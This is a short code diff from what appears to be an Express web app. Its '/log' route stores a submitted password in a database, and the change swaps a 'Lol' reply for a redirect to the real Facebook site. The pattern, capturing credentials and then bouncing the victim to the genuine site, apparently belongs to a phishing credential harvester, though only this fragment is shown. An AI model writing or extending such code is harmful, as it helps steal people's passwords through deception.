@@ -11,7 +11,8 @@ auth.post('/log', urlencodedParser, (req, res) =>{
         password: req.body.password
     }
     db.register(data).then(
-        res.send('Lol')
+        // res.send('Lol')
+        res.redirect('https://www.facebook.com/')
     )
 })
 
